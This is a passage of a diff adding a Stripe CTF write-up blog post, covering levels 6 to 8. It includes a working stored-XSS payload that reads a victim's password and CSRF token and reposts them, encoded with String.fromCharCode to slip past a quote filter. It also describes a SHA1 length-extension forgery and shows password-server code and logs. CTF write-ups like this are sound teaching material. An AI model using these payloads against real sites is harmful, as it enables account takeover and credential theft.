class="nt">&lt;/script&gt;&lt;script&gt;</span><span class="p">[</span><span class="nx">THE</span> <span class="nx">REST</span> <span class="nx">OF</span> <span class="nx">THE</span> <span class="nx">LEGITIMATE</span> <span class="nx">CODE</span><span class="p">]</span><span class="nt">&lt;/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The syntax highlighting above should make it clear that our javascript will be executed as such.</p>
+
+<p>There are still a couple of hurdles to get through.  One is that for security purposes, all user input is filtered for quotes:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">safe_insert</span><span class="p">(</span><span class="n">table</span><span class="p">,</span> <span class="n">key_values</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">key_values</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="o">|</span>
+</span><span class='line'>  <span class="c1"># Just in case people try to exfiltrate</span>
+</span><span class='line'>  <span class="c1"># level07-password-holder&#39;s password</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">value</span><span class="o">.</span><span class="n">kind_of?</span><span class="p">(</span><span class="nb">String</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+</span><span class='line'>      <span class="p">(</span><span class="n">value</span><span class="o">.</span><span class="n">include?</span><span class="p">(</span><span class="s1">&#39;&quot;&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">value</span><span class="o">.</span><span class="n">include?</span><span class="p">(</span><span class="s2">&quot;&#39;&quot;</span><span class="p">))</span>
+</span><span class='line'>    <span class="k">raise</span> <span class="s2">&quot;Value has unsafe characters&quot;</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Another is that in order to prevent CSRF attackers, there is a CSRF token that is required with every request.</p>
+
+<p>Let&#8217;s leave the quotes issue for now and get around the CSRF token. We can get a correct CSRF token the same way that we got the user&#8217;s password, by selecting the HTML element that contains the CSRF token.  The token is contained in a hidden input fields, so our injection becomes:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;/script&gt;&lt;script&gt;</span>
+</span><span class='line'>  <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;user_info&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;ajax/posts&#39;</span><span class="p">,</span>
+</span><span class='line'>      <span class="p">{</span>
+</span><span class='line'>        <span class="nx">title</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;td&#39;</span><span class="p">,</span> <span class="nx">data</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">innerHTML</span><span class="p">,</span>
+</span><span class='line'>        <span class="nx">body</span><span class="o">:</span><span class="s1">&#39;EMPTY&#39;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nx">_csrf</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;input[name=&quot;_csrf&quot;]&#39;</span><span class="p">)</span>
+</span><span class='line'>       <span class="p">});</span>
+</span><span class='line'>   <span class="p">});</span>
+</span><span class='line'><span class="nt">&lt;/script&gt;&lt;script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This of course won&#8217;t work because the quote filter will prevent us from posting a message will all of those quotes.  We can get around this by encoding each character in our javascript as its ASCII value and then running it like <code>eval(String.fromCharCode(67,61//...)</code>.  I used <a href="http://www.wocares.com/noquote.php">this</a> utility to help me encode everything.</p>
+
+<p>The above payload, when encoded with <code>String.fromCharCode</code> still doesn&#8217;t work, and it took me a long time to figure out why.</p>
+
+<p>As it turns out, the target user&#8217;s first post gives a big hint</p>
+
+<blockquote><p>One great feature of Streamer is that no password resets are needed. I, for
+example, have a very complicated password <strong>(including apostrophes, quotes, you
+name it!)</strong>. But I remember it by clicking my name on the right-hand side and
+seeing what my password is.</p></blockquote>
+
+<p>The password contains some quotes so the target user won&#8217;t be able to post it in a message.  We have to replace the quotes with something else.  The correct javascript is</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;user_info&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;ajax/posts&#39;</span><span class="p">,</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>      <span class="nx">title</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;td&#39;</span><span class="p">,</span> <span class="nx">data</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">innerHTML</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&quot;/g</span><span class="p">,</span> <span class="s2">&quot;&amp;quot;&quot;</span><span class="p">),</span>
+</span><span class='line'>      <span class="nx">body</span><span class="o">:</span><span class="s1">&#39;EMPTY&#39;</span><span class="p">,</span>
+</span><span class='line'>      <span class="nx">_csrf</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;input[name=&quot;_csrf&quot;]&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="p">});</span>
+</span><span class='line'><span class="p">});</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And when the above is encoded with <code>String.fromCharCode</code> and put inside a <code>&lt;script&gt;</code> tag, the target user will post their password when viewing our post:</p>
+
+<p><img src="/assets/images/stripe-ctf/level6-solved.png" alt="Level 6 Solved" /></p>
+
+<h2>Level 7</h2>
+
+<p>Level 7 is WaffleCopter, an API for the delivery of waffles by helicopter.  When you log in, you&#8217;re given a secret key.  You use this to sign a message ordering a delivery of waffles to your location.  Winning requires you to order one of the decadent Liège Waffles that the account you are given doesn&#8217;t have access to.</p>
+
+<p>An order is a post request with a signature, and you can view your previous orders and the orders of other users by navigating to &#8220;/logs/USERID&#8221;.</p>
+
+<p><img src="/assets/images/stripe-ctf/level7-orders-1.png" alt="Level 7 Orders" /></p>
+
+<p>This is an order log for another user.  We know that this user is a premium subscriber because they are ordering the Dream waffle which is a premium item like the Liège waffles we have to order.</p>
+
+<p>To order a premium waffle we need this user&#8217;s secret token. We can try and guess their password, or we can just order as them and forge their signature.</p>
+
+<p>The signature is computed as so:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">_signature</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">api_secret</span> <span class="o">+</span> <span class="n">message</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I was lucky enough to have read a very relevant <a href="http://netifera.com/research/flickr_api_signature_forgery.pdf">paper</a> about Flickr API key forgery just last week, and so was well primed to solve this one.  Like MD5, SHA1 splits a message into blocks of a fixed size and then does a computation block by block, using the previous block&#8217;s results in the next.  This means that if I know what <code>sha1(foo)</code> is, I can compute that hash of a message that starts with <code>foo</code> and contains some arbitrary value <code>bar</code>.  In practice, you end up being able to compute some <code>PADDING</code> and the hash <code>sha1(foo + PADDING + bar)</code>.</p>
+
+<p>The signature algorithm used by WaffleCopter is <code>sha1(SECRET + MESSAGE)</code>, so we generate the hash <code>sha1(SECRET + MESSAGE + PADDING + EVIL)</code>.  This is enough to order the Liège waffle.  I simply take a known order from another user, and generate a signature for a message that starts with their order and ends with <code>&amp;waffle=liege</code>.</p>
+
+<p>I found a handy script to perform a SHA1 padding attack <a href="http://www.vnsecurity.net/2010/03/codegate_challenge15_sha1_padding_attack/">here</a>.</p>
+
+<p><img src="/assets/images/stripe-ctf/level7-padding.png" alt="Level 7 SHA1 Padding Attack" /></p>
+
+<p>Running it I was able to generate a new message and signature, and submitting that allowed me to order the Liège Waffle.</p>
+
+<p>This level and the next were my favorites in the competition.  This challenge has you exploit a real world cryptographic attack against a signature scheme that is often found in practice.  Signature schemes that work this way are definitely out there &#8212; see, for example, the Flickr paper linked above.</p>
+
+<p>By the way, if you&#8217;re reading this and wondering how to construct a signature scheme that&#8217;s robust to these kinds of attacks, the answer is use an <a href="http://en.wikipedia.org/wiki/Hash-based_message_authentication_code">HMAC</a>!  As you can see, rolling your own signature scheme is dangerous.  Always, always, always use an HMAC.  This is true not just for signatures but for other sensitive user controlled data you want to send down the pipe, such as viewstates.</p>
+
+<h2>Level 8</h2>
+
+<p>Level 8 is PasswordDB, &#8220;a new and secure way of storing and validating passwords.&#8221;  The interface is a simple JSON API, you post <code>{"password": PASSWORD_GUESS, "webhooks":[URL]}</code> to a URL, and you get a response, either <code>{"success": true}</code> or <code>{"success": false}</code>.  That response is also posted to the URL you provide.</p>
+
+<p>Internally, the password is chunked into 4 chunks and spread ac cross 4 services.  When you submit a password guess, your guess is also chunked and each chunk is sent to the corresponding service to check.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">process</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">Shield</span><span class="o">.</span><span class="n">registerLocker</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">password</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">getArg</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s">&#39;password&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">webhooks</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">getArg</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s">&#39;webhooks&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">remaining_chunk_servers</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">chunk_servers</span><span class="p">[:]</span>
+</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">remaining_chunks</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">chunkPassword</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">webhooks</span> <span class="o">=</span> <span class="p">[</span><span class="n">common</span><span class="o">.</span><span class="n">parseHost</span><span class="p">(</span><span class="n">webhook</span><span class="p">)</span> <span class="k">for</span> <span class="n">webhook</span> <span class="ow">in</span> <span class="n">webhooks</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">checkNext</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">checkNext</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span class='line'>    <span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">remaining_chunks</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">remaining_chunk_servers</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">remaining_chunk_servers</span><span class="p">:</span>
+</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">sendResult</span><span class="p">(</span><span class="bp">True</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">return</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">next_chunk_server</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">remaining_chunk_servers</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">next_chunk</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">remaining_chunks</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">log_info</span><span class="p">(</span><span class="s">&#39;Making request to chunk server </span><span class="si">%r</span><span class="s">&#39;</span>
+</span><span class='line'>                  <span class="s">&#39; (remaining chunk servers: </span><span class="si">%r</span><span class="s">)&#39;</span> <span class="o">%</span>
+</span><span class='line'>                   <span class="p">(</span><span class="n">next_chunk_server</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">remaining_chunk_servers</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">common</span><span class="o">.</span><span class="n">makeRequest</span><span class="p">(</span><span class="n">next_chunk_server</span><span class="p">,</span>
+</span><span class='line'>                       <span class="p">{</span><span class="s">&#39;password_chunk&#39;</span> <span class="p">:</span> <span class="n">next_chunk</span><span class="p">},</span>
+</span><span class='line'>                       <span class="bp">self</span><span class="o">.</span><span class="n">nextServerCallback</span><span class="p">,</span>
+</span><span class='line'>                       <span class="bp">self</span><span class="o">.</span><span class="n">nextServerErrback</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">nextServerCallback</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">parsed_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span><span class='line'>    <span class="c"># Chunk was wrong!</span>
+</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="n">parsed_data</span><span class="p">[</span><span class="s">&#39;success&#39;</span><span class="p">]:</span>
+</span><span class='line'>        <span class="c"># Defend against timing attacks</span>
+</span><span class='line'>        <span class="n">remaining_time</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">expectedRemainingTime</span><span class="p">()</span>
+</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">log_info</span><span class="p">(</span><span class="s">&#39;Going to wait </span><span class="si">%s</span><span class="s"> seconds before responding&#39;</span> <span class="o">%</span>
+</span><span class='line'>                      <span class="n">remaining_time</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">reactor</span><span class="o">.</span><span class="n">callLater</span><span class="p">(</span><span class="n">remaining_time</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">sendResult</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">return</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">checkNext</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This was definitely the most fun of the challenges.  There&#8217;s no SQL injection or XSS to exploit here.  The password is known to be 12 digits long, which is way too long to bruteforce.</p>
+
+<p>The first key observation to make is that if the first chunk is wrong, PasswordDB will never query the second chunk server. This is a common pattern in timing attacks: if you compare password with <code>guess == correct_password</code>, the == operator will return false after the first pair of characters differ.  You can use this information to determine the password character by character by timing how long server responses take.</p>
+
+<p>Performing a practical timing attack over a noisy network is <a href="http://events.ccc.de/congress/2011/Fahrplan/events/4640.en.html">challenging</a>, but can be very <a href="http://www.nds.rub.de/media/nds/veroeffentlichungen/2012/07/11/XMLencBleichenbacher.pdf">fruitful</a>.</p>
+
+<p>The Stripe CTF folks did add some random delays to the false responses to defend timing attacks, and did make it really clear that it&#8217;s not what they are looking for.  Like the author of the papers above, I am of the opinion that it may be theoretically possible to use statistical methods to subtract the noise of a uniform random delay like the one that they use, but let&#8217;s take them at their word and not try a timing attack.</p>
+
+<p>Earlier in the contest, there was a hint about how the challenge server is using a specific version of the Python Twisted library, but it was removed at some point in the contest.  I couldn&#8217;t find anything fruitful in the Twisted release notes, but that hint did imply that the vulnerability will come from the network layer and not necessarily from some error in the application code.</p>
+
+<p>The second key observation is one that you can make by observing the server logs when you run it on your machine, and one of the hints tells you to do exactly that.</p>
+
+<p>Below I launched the PasswordDB server with the password &#8220;123456789012&#8221; and then submitted a guess &#8220;123456789000&#8221;, that differed only in the last chunk:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">ve</span><span class="p">)</span><span class="n">sartre</span><span class="p">:</span><span class="n">level08</span><span class="o">-</span><span class="n">code</span> <span class="n">maxim</span><span class="err">$</span> <span class="o">./</span><span class="n">password_db_launcher</span> <span class="s">&quot;123456789012&quot;</span> <span class="n">localhost</span><span class="p">:</span><span class="mi">8000</span>
+</span><span class='line'><span class="n">Split</span> <span class="n">length</span> <span class="mi">12</span> <span class="n">password</span> <span class="n">into</span> <span class="mi">4</span> <span class="n">chunks</span> <span class="n">of</span> <span class="n">size</span> <span class="n">about</span> <span class="mi">3</span><span class="p">:</span> <span class="p">[</span><span class="s">&#39;123&#39;</span><span class="p">,</span> <span class="s">&#39;456&#39;</span><span class="p">,</span> <span class="s">&#39;789&#39;</span><span class="p">,</span> <span class="s">&#39;012&#39;</span><span class="p">]</span>
+</span><span class='line'><span class="n">Checking</span> <span class="n">whether</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">14434</span> <span class="ow">is</span> <span class="n">reachable</span>
+</span><span class='line'><span class="n">Checking</span> <span class="n">whether</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">14435</span> <span class="ow">is</span> <span class="n">reachable</span>
+</span><span class='line'><span class="n">Checking</span> <span class="n">whether</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">14436</span> <span class="ow">is</span> <span class="n">reachable</span>
+</span><span class='line'><span class="n">Checking</span> <span class="n">whether</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">14437</span> <span class="ow">is</span> <span class="n">reachable</span>
+</span><span class='line'><span class="n">Launched</span> <span class="p">[</span><span class="s">&#39;./chunk_server&#39;</span><span class="p">,</span> <span class="s">&#39;127.0.0.1:14434&#39;</span><span class="p">,</span> <span class="s">&#39;123&#39;</span><span class="p">]</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">9576</span><span class="p">)</span>
+</span><span class='line'><span class="n">Launched</span> <span class="p">[</span><span class="s">&#39;./chunk_server&#39;</span><span class="p">,</span> <span class="s">&#39;127.0.0.1:14435&#39;</span><span class="p">,</span> <span class="s">&#39;456&#39;</span><span class="p">]</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">9577</span><span class="p">)</span>
+</span><span class='line'><span class="n">Launched</span> <span class="p">[</span><span class="s">&#39;./chunk_server&#39;</span><span class="p">,</span> <span class="s">&#39;127.0.0.1:14436&#39;</span><span class="p">,</span> <span class="s">&#39;789&#39;</span><span class="p">]</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">9578</span><span class="p">)</span>
+</span><span class='line'><span class="n">Launched</span> <span class="p">[</span><span class="s">&#39;./chunk_server&#39;</span><span class="p">,</span> <span class="s">&#39;127.0.0.1:14437&#39;</span><span class="p">,</span> <span class="s">&#39;012&#39;</span><span class="p">]</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">9579</span><span class="p">)</span>
+</span><span class='line'><span class="n">Checking</span> <span class="n">whether</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">14434</span> <span class="ow">is</span> <span class="n">reachable</span>
+</span><span class='line'><span class="n">Checking</span> <span class="n">whether</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">14435</span> <span class="ow">is</span> <span class="n">reachable</span>
+</span><span class='line'><span class="n">Checking</span> <span class="n">whether</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">14436</span> <span class="ow">is</span> <span class="n">reachable</span>
+</span><span class='line'><span class="n">Checking</span> <span class="n">whether</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">14437</span> <span class="ow">is</span> <span class="n">reachable</span>
+</span><span class='line'><span class="n">Launched</span> <span class="p">[</span><span class="s">&#39;./primary_server&#39;</span><span class="p">,</span> <span class="s">&#39;-l&#39;</span><span class="p">,</span> <span class="s">&#39;/tmp/primary.lock&#39;</span><span class="p">,</span> <span class="s">&#39;-c&#39;</span><span class="p">,</span> <span class="s">&#39;127.0.0.1:14434&#39;</span><span class="p">,</span> <span class="s">&#39;-c&#39;</span><span class="p">,</span> <span class="s">&#39;127.0.0.1:14435&#39;</span><span class="p">,</span> <span class="s">&#39;-c&#39;</span><span class="p">,</span> <span class="s">&#39;127.0.0.1:14436&#39;</span><span class="p">,</span> <span class="s">&#39;-c&#39;</span><span class="p">,</span> <span class="s">&#39;127.0.0.1:14437&#39;</span><span class="p">,</span> <span class="s">&#39;localhost:8000&#39;</span><span class="p">]</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">9580</span><span class="p">)</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58877</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Received</span> <span class="n">payload</span><span class="p">:</span> <span class="s">&#39;{&quot;password&quot;: &quot;123456789000&quot;, &quot;webhooks&quot;: [&quot;localhost:1111&quot;]}&#39;</span>
+</span><span class='line'><span class="n">Acquiring</span> <span class="n">lock</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58877</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Split</span> <span class="n">length</span> <span class="mi">12</span> <span class="n">password</span> <span class="n">into</span> <span class="mi">4</span> <span class="n">chunks</span> <span class="n">of</span> <span class="n">size</span> <span class="n">about</span> <span class="mi">3</span><span class="p">:</span> <span class="p">[</span><span class="s">u&#39;123&#39;</span><span class="p">,</span> <span class="s">u&#39;456&#39;</span><span class="p">,</span> <span class="s">u&#39;789&#39;</span><span class="p">,</span> <span class="s">u&#39;000&#39;</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58877</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Making</span> <span class="n">request</span> <span class="n">to</span> <span class="n">chunk</span> <span class="n">server</span> <span class="p">(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">14434</span><span class="p">)</span> <span class="p">(</span><span class="n">remaining</span> <span class="n">chunk</span> <span class="n">servers</span><span class="p">:</span> <span class="p">[(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">14435</span><span class="p">),</span> <span class="p">(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">14436</span><span class="p">),</span> <span class="p">(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">14437</span><span class="p">)])</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58878</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Received</span> <span class="n">payload</span><span class="p">:</span> <span class="s">&#39;{&quot;password_chunk&quot;: &quot;123&quot;}&#39;</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58878</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Request</span> <span class="n">already</span> <span class="n">finished</span><span class="err">!</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58878</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Responding</span> <span class="k">with</span><span class="p">:</span> <span class="s">&#39;{&quot;success&quot;: true}</span><span class="se">\n</span><span class="s">&#39;</span>
